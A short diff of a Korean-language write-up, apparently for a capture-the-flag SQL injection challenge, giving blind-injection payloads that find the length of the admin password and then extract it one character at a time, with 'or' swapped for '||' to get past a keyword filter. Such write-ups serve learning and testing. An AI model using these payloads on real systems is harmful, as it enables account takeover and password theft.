@@ -37,5 +37,5 @@
 	- `id`가 `admin`인 `pw`의 길이를 알아낸다.
 		+ `' || id='admin' && length(pw) < {X}`
 	- 알아낸 길이를 통해 `pw`를 한 글자씩 알아낸다.
-		+ `' or id='admin' && ascii(substr(pw,{i},1)) < {X}`
+		+ `' || id='admin' && ascii(substr(pw,{i},1)) < {X}`
 * `or`을 `||`로, `and`를 `&&`로 치환한다.
